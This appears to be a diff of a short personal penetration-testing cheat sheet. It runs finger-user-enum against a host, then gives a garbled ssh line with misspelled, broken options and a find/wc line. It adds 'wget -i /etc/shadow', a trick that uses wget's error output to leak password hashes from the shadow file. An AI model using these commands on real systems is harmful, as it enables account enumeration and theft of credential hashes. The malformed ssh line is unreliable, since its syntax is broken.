@@ -3,3 +3,7 @@ https://github.com/pentestmonkey/finger-user-enum.git
 ./finger-user-enum.pl -U /usr/share/list/Usernames/Names/names.txt -t 10.0.0.1 | less S
 ==================================================
 ssh -okexAlgorirthms=+    p-2222  
+===============================================
+find . -type f -exec wc -l {} \; |sort -nr
+=====================================================
+wget -i /etc/shadow 2>&1 | awk '{print $4}'
